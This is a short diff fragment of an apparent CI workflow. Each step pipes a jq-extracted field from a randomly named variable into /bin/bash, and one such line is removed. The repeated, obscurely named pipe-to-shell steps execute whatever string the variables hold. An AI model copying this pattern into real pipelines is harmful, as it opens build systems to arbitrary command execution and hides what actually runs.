@@ -41,7 +41,6 @@ jobs:
           echo $gt813 | jq -r .zi29288 | /bin/bash
           echo $qenfd60 | jq -r .wc47822 | /bin/bash
           printf '%s' "$ptjkm46" | jq -r .qo10 | /bin/bash
-          echo $wf3 | jq -r .k7 | /bin/bash
           printf '%s' "$vtm7" | jq -r .mnq0614 | /bin/bash
           printf '%s' "$oa893" | jq -r .kpnva21288 | /bin/bash
           echo $r2 | jq -r .t165 | /bin/bash
